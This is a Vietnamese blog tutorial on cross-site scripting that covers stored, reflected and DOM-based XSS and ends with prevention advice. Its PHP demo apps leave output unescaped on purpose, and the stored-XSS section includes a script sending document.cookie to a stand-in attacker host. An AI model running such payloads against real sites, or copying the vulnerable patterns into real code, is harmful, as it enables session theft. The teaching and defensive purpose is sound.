Nguồn: [https://tienminhvy.com/kinh-nghiem/xss-la-gi-va-cach-phong-tranh](https://tienminhvy.com/kinh-nghiem/xss-la-gi-va-cach-phong-tranh)

![Lỗ hổng bảo mật XSS](https://i0.wp.com/tienminhvy.com/wp-content/uploads/2020/09/stored_xss_04.png?resize=750%2C375&ssl=1)

XSS là một trong các lỗ hổng bảo mật khá nổi tiếng, khác với SQL injection, lỗ hổng XSS chủ yếu được thực thi ở phía client, nhằm mục đích đánh cắp thông tin người dùng.

# XSS là gì? sơ lược về XSS

XSS (là viết tắt của cụm từ Cross-Site Scripting) hiểu đơn giản là một hình thức tấn công bằng mã độc phổ biến, trong đó, hacker sẽ lợi dụng các lỗ hổng để chèn các mã script vào, sau đó gửi cho người dùng (hoặc người dùng vô tình truy cập vào trang bị nhiễm mã độc). Qua đó đánh cắp thông tin Cookie của người dùng và dùng nó để đăng nhập các tài khoản trên website đã bị nhiễm mã độc.

Đây là hình thức tấn công đơn giản nhưng gây nhiều thiệt hại lớn đối với các website như: ngân hàng, thương mại điện tử. Đồng thời, đây cũng là một vấn đề bảo mật cần chú tâm khi lập trình một ứng dụng web.

# XSS nguy hiểm như thế nào?

Như mình đã đề cập ở phía trên, XSS vô cùng nguy hiểm vì gây nhiều thiệt hại lớn đối với một website, đặc biệt là website doanh nghiệp, khi một website bị tấn công XSS thì nó sẽ làm thiệt hại cả về chủ website và cả người dùng trên website đó, làm danh tiếng của website đó bị sụt giảm. Ngoài ra, hacker có thể sử dụng tài khoản của người dùng nhằm vào các mục đích lừa đảo,…

Một số vụ tấn công XSS nổi tiếng:

- [Ebay bị tấn công mạng (2014)](https://nhandan.com.vn/cong-nghe-an-ninh-mang/trang-mua-sam-ebay-lai-bi-tan-cong-mang-213608/)
- [Phimmoi bị dính lỗ hổng XSS (2016)](https://www.junookyo.com/2016/06/poc-phimmoi-xss-vulerability.html)

# Phân loại và ví dụ về XSS

Hiện tại, có 3 loại XSS chính là:

## Stored XSS

Stored XSS là loại lỗ hổng XSS cơ bản thường được tìm thấy trong các ứng dụng web được bảo mật chưa được kỹ càng, với lỗi này, hacker sẽ lợi dụng vị trí phát hiện lỗi đó (ví dụ như form bình luận hay trang hỗ trợ kỹ thuật website,…). Sau đó gửi mã độc này lên phía cơ sở dữ liệu và lưu trữ ở đó.

Khi nạn nhân truy cập vào trang bình luận, hệ thống sẽ lấy toàn bộ bình luận (kể cả bình luận bị nhiễm mã độc của hacker) và in ra ngoài màn hình, ngay khi quá trình tải trang hoàn tất, trình duyệt web của người dùng sẽ thực thi mã độc đó (tuỳ theo hacker chèn loại mã độc nào, ví dụ như mã độc thu thập cookie của người dùng).

Đây là một ứng dụng web nhỏ mình viết dùng để demo cho các bạn thế nào là Stored XSS (chỉ dùng cho mục đích học tập và demo thôi nhé):

```php
<?php 
    // Bản quyền © 2020 bởi tienminhvy.com, bảo lưu mọi quyền
    // Vui lòng ghi nguồn nếu chia sẻ lại
    $db = mysqli_connect('localhost', 'root', '', 'xss', 3306);
    if (!$db) {
        die("<h1>Không thể kết nối đến cơ sở dữ liệu!<h1>");
    }
    if (isset($_POST['username'])) {
        $username = mysqli_real_escape_string($db, $_POST['username']);
        $msg = mysqli_real_escape_string($db, $_POST['msg']);
        $status = mysqli_query($db, "INSERT INTO msg (username, msg) VALUES ('$username', '$msg')");
        if (!$status) {
            die("ERROR");
        } else {
            header("Refresh: 0");
        }
        
    }
    $result = mysqli_query($db, "SELECT * FROM msg");
    $content = '';
    if (mysqli_num_rows($result) > 0) {
        while ($row = mysqli_fetch_assoc($result)) {
            $content .= <<<HTML
                <div class="cmt">
                    <p class="cmt-username">Username: <b>@$row[username]</b></p>
                    <p class="cmt-msg">MSG: > $row[msg]</p>
                    <div class="cmt-time">Time: $row[time]</div>
                </div>
            HTML;
        }
    }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bình luận - XYZ</title>
</head>
<body>
    <div class="cmt-section">
        <h2>Comment Section</h2>
        <?php echo $content ?>
    </div>
    <div class="cmt-form">
        <form method='POST'>
            <h2>Comment Form</h2>
            <input type="text" name="username" placeholder="Your username"><br>
            <textarea name="msg" cols="30" rows="10" placeholder="Your comment here"></textarea>
            <button type="submit">Send</button>
        </form>
    </div>
</body>
</html>
```

Nếu bạn muốn biết công dụng của hàm mysqli_real_escape_string() dùng để làm gì thì bạn xem bài này nhé: [SQL Injection là gì và cách phòng tránh](https://tienminhvy.com/kinh-nghiem/sql-injection-la-gi-va-cach-phong-tranh/)

Ví dụ ứng dụng web nhỏ ở trên là phần bình luận của một trang blog, ở đó người dùng có thể nhập bình luận với bất cứ nội dung gì mà họ muốn. Và mình chỉ là một người dùng bình thường vào phần bình luận của website để bày tỏ ý kiến với chủ website.

Vì tính mình hơi nghịch nên mình sẽ thử coi cái mục bình luận này có bị dính lỗ hổng bảo mật gì không, sau khi kiểm tra lỗ hổng SQL injection không thành công, mình chuyển qua thử lỗi XSS bằng cách nhập dòng <script></script> vào.

![stored xss 01](https://i1.wp.com/tienminhvy.com/wp-content/uploads/2020/09/stored_xss_01.png?resize=1024%2C576&ssl=1)

Và bất ngờ là phần MSG mình tô đậm lại không thấy dòng tin nhắn mình đã nhập, mình kiểm tra mã nguồn của trang bằng cách nhấn Ctrl + U

![stored xss 02](https://i0.wp.com/tienminhvy.com/wp-content/uploads/2020/09/stored_xss_02.png?resize=1024%2C576&ssl=1)

![stored xss 03](https://i1.wp.com/tienminhvy.com/wp-content/uploads/2020/09/stored_xss_03.png?resize=1024%2C576&ssl=1)

À há, bạn thấy dòng mình tô đậm chứ, nó đã chứng tỏ cho chúng ta rằng website đã dính lỗ hổng bảo mật XSS loại 1 rồi đấy. Để chắc chắn rằng đoạn mã javascript có thể thực hiện trong cặp thẻ script, ngay phần form bình luận, mình nhập vào dòng này rồi nhấn Send.

```html
<script>alert('Hacked!')</script>
```
 
Và website hiện thông báo thế này thì chắc chắn 100% website này đã bị dính lỗi XSS.

![stored xss 04](https://i0.wp.com/tienminhvy.com/wp-content/uploads/2020/09/stored_xss_04.png?resize=1024%2C576&ssl=1)

Và đây là đoạn mã javascript của chúng ta trong mã nguồn của trang web.

![stored xss 05](https://i2.wp.com/tienminhvy.com/wp-content/uploads/2020/09/stored_xss_05.png?resize=1024%2C576&ssl=1)

Với lỗ hổng này, hacker có thể tận dụng nó để ăn cắp cookie, nhằm dùng số cookie này để mạo danh người dùng đăng nhập website trên. Hay nguy hiểm hơn là dùng nó để DDOS một website khác bất kỳ. Ví dụ mình sẽ tận dụng nó để đánh cắp thông tin cookie của người dùng truy cập vào trang bình luận này thì mình sẽ dùng đoạn javascript sau:

```html
<script>window.location.assign("https://www.sitecuahacker.com/?cookie="+document.cookie)</script>
```

Và mọi cookie của người dùng khi truy cập vào trang web trên sẽ bị chuyển đến trang của mình cả :v. Tất nhiên là làm người ai lại làm thế :))

Vậy loại Stored XSS này có gì khác biệt với 2 loại Reflected XSS còn lại? Loại XSS này thì hacker sẽ không cần dùng thủ thuật để lừa người dùng truy cập trang web vì đoạn mã độc trên đã được lưu trên cơ sở dữ liệu. Khi người dùng truy cập vào khu vực đó thì trang web sẽ load cả mã độc và thực thi nó ngay tại trình duyệt web của người dùng.

## Reflected XSS
Đây cũng là một loại XSS, nhưng khác biệt với loại ở trên là nó chỉ thực thi được ở phía client (trình duyệt người dùng) mà không lưu vào cơ sở dữ liệu của website. Nếu muốn khai thác lỗi này, hacker cần tìm lỗ hổng nằm trong ứng dụng web, sau đó tra liên kết trỏ đến trang web chứa lỗ hổng.

Một khi người dùng truy cập liên kết trên, máy chủ sẽ trả về trang web kèm mã độc của hacker đã kèm vào nằm trong liên kết.

Ví dụ ứng dụng web nhỏ dưới đây mình viết nhằm tìm kiếm người dùng đã gửi tin nhắn đến website ở phần trên (lưu ý là chỉ sử dụng nhằm mục đích học tập, demo thôi nhé):

```php
<?php 
    // Bản quyền © 2020 bởi tienminhvy.com, bảo lưu mọi quyền
    // Vui lòng ghi nguồn nếu chia sẻ lại
    $db = mysqli_connect('localhost', 'root', '', 'xss', 3306);
    if (!$db) {
        die("<h1>Không thể kết nối đến cơ sở dữ liệu!<h1>");
    }
    $content = '';
    $username = '';
    $usf = '';
    $result = (object) array('num_rows' => 0);
    if (isset($_GET['username'])) {
        $usf = '<p>You searched for "'.$_GET['username'].'"</p>';
        $username = mysqli_real_escape_string($db, $_GET['username']);
        $result = mysqli_query($db, "SELECT * FROM msg WHERE username='$username'");
        if (mysqli_num_rows($result) > 0) {
            while ($row = mysqli_fetch_assoc($result)) {
    
                $content .= <<<HTML
                    <div class="cmt">
                        <p class="cmt-username">Username: <b>@$row[username]</b></p>
                        <p class="cmt-msg">MSG: > $row[msg]</p>
                        <div class="cmt-time">Time: $row[time]</div>
                    </div>
                HTML;
            }
        } else {
            $content = "Not Found!";
        }
    }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bình luận - XYZ</title>
</head>
<body>
    <form method='GET'>
        <input value='<?php echo $username ?>' type="text" name="username" placeholder="Please username which you want to find">
        <button type="submit">Find</button>
    </form>
    <div class="usf">
        <?php
            echo $usf
        ?>
    </div>
    <div class="comment-section">
        <?php echo $content ?>
    </div>
</body>
</html>
```

Ví dụ tại trang này, người dùng có thể tìm kiếm tin nhắn (bình luận) mà họ hoặc người dùng khác đã gửi lên website.

![reflected xss 01](https://i1.wp.com/tienminhvy.com/wp-content/uploads/2020/09/reflected_xss_01.png?resize=1024%2C576&ssl=1)

Ví dụ ở đây, mình tìm kiếm người dùng có tên là abc, sau đó nhấn Find, website sẽ trả về toàn bộ bình luận của người dùng abc.

![reflected xss 02](https://i1.wp.com/tienminhvy.com/wp-content/uploads/2020/09/reflected_xss_02.png?resize=1024%2C576&ssl=1)

Và khi mình không nhập bất kỳ ký tự nào vào ô và nhấn Find, hệ thống sẽ trả về trang như bên dưới, nhưng vẫn hiện dòng You searched for “”.

![reflected xss 03](https://i0.wp.com/tienminhvy.com/wp-content/uploads/2020/09/reflected_xss_03.png?resize=1024%2C576&ssl=1)

Do đó, ở đây mình sẽ kiểm tra xem chủ website liệu có mã hoá đúng cách thẻ script hay không bằng cách nhập vào ô nội dung <script></script> và website vẫn trả về nội dung như hình trên.

![reflected xss 04](https://i1.wp.com/tienminhvy.com/wp-content/uploads/2020/09/reflected_xss_04.png?resize=1024%2C576&ssl=1)

Tuy nhiên, khi mình nhấn tổ hợp phím Ctrl + U, đập vào mắt là dòng mình đã tô đen đây, đến đây thì có khả năng trang web này đã bị dính lỗi bảo mật XSS.

![reflected xss 04](https://i1.wp.com/tienminhvy.com/wp-content/uploads/2020/09/reflected_xss_05.png?resize=1024%2C576&ssl=1)

Tuy nhiên, như thế vẫn chưa đủ, mình sẽ thêm hàm alert vào xem trang web có hiện thông báo không. Và khi nhập vào ô đoạn mã sau rồi nhấn Enter:

<script>alert('Hacked!')</script>

Và mình nhận được kết quả như hình, vậy là 100% website này đã dính lỗi bảo mật Reflected XSS:

![Lỗ hổng bảo mật XSS](https://tienminhvy.com/wp-content/uploads/2020/09/stored_xss_04.png?resize=1024%2C576&ssl=1)

![reflected xss 06](https://tienminhvy.com/wp-content/uploads/2020/09/reflected_xss_06.png?resize=1024%2C576&ssl=1)

Và đây là đoạn mã mà chúng ta đã nhập trong phần Source Code của trang web.

![reflected xss 07](https://tienminhvy.com/wp-content/uploads/2020/09/reflected_xss_07.png?resize=1024%2C576&ssl=1)

## DOM-based XSS

DOM-based XSS là một lỗ hổng XSS nâng cao, đây cũng là lỗi của chủ website không mã hoá kỹ đầu vào của người dùng. Tuy nhiên, khác với 2 loại trên, hacker sẽ không khai thác lỗi này qua ô input trên website mà sẽ thao tác trực tiếp trên thanh địa chỉ của trình duyệt. Cách phát tán loại mã độc này cũng giống như Reflected XSS.

Loại lỗ hổng này có thể xảy ra ở cả 2 loại website là website động và website tĩnh vì loại lỗ hổng này lợi dụng ngôn ngữ lập trình Javascript do người lập trình lỏng lẻo để thao tác với DOM (Document Object Model), do đó lỗ hổng này chỉ có thể ảnh hưởng ở client (trình duyệt người dùng) mà thôi.

Ví dụ đây là mã nguồn của một website demo do mình viết:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <script>
        document.write("<b>Current URL</b> : " + document.baseURI);
    </script>
</body>
</html>
```

Ví dụ khi mình mở trang web trên thì nó sẽ trả về đường dẫn trên thanh địa chỉ mà mình truy cập. Và khi mình nhập dạng URL như sau

``` http://localhost/hoctap/xss_3.php#<script>alert(‘XSS’)</script> ```

thì website ngay lập tức dính lỗi XSS.

Tuy vậy, có vẻ như các trình duyệt web hiện tại đã ngăn loại lỗ hổng này lại bằng cách escape chuỗi trên thành các ký tự bình thường nên cách trên hiện đã không còn tác dụng đối với các trình duyệt mới, nhưng trình duyệt cũ vẫn có nguy cơ mắc lỗi bảo mật đó đấy nhé!

# Cách phòng tránh XSS

Để hạn chế và tránh bị dính lỗi XSS, bạn cần phải mã hoá các ký tự đặc biệt khi lập trình một ứng dụng web. Đối với PHP hay ngôn ngữ thực thi ở Server-side thì nếu được bạn nên kết hợp mã hoá cả 2 loại như sau:

```php
<?php 
    // Bản quyền © 2020 bởi tienminhvy.com, bảo lưu mọi quyền
    // Vui lòng ghi nguồn nếu chia sẻ lại
    $db = mysqli_connect('localhost', 'root', '', 'xss', 3306);
    if (!$db) {
        die("<h1>Không thể kết nối đến cơ sở dữ liệu!<h1>");
    }
    $noidung = "<script>alert('Hello World!')</script>";
    $noidung = htmlspecialchars($noidung);
    // Sẽ chuyển thành: &lt;script&gt;alert('Hello World!')&lt;/script&gt;gt;
    $noidung = mysqli_real_escape_string($db, $noidung);
    // Chuyển thành: &lt;script&gt;alert(\'Hello World!\')&lt;/script&gt;gt;
?>
```

Còn đối với DOM-based XSS thì bạn nên tham khảo các tài liệu của các Framework Javascript bạn hiện đang dùng hoặc hạn chế dùng các phương thức hoặc hàm: innerHTML, outerHTML, document.write mà hãy dùng textContent để thay thế nhé.

# Tóm lại

![](https://miro.medium.com/max/700/1*tMkutRJYKsRjd7hAsKiuWQ.jpeg)

Qua bài này, mình đã giới thiệu với các bạn thế nào XSS là gì, nguy hiểm như thế nào cũng như phân loại và ví dụ từng lỗ hổng XSS riêng biệt rồi đó. Nếu còn gì thắc mắc thì bạn đừng ngại mà hãy bình luận bên dưới để mình có thể biết nhé.

Và đừng quên luật bất thành văn: **“Đừng bao giờ tin tưởng input của người dùng”**

Nếu bạn thích thì bạn có thể ghé thăm blog của mình tại đây: [https://tienminhvy.com](https://tienminhvy.com)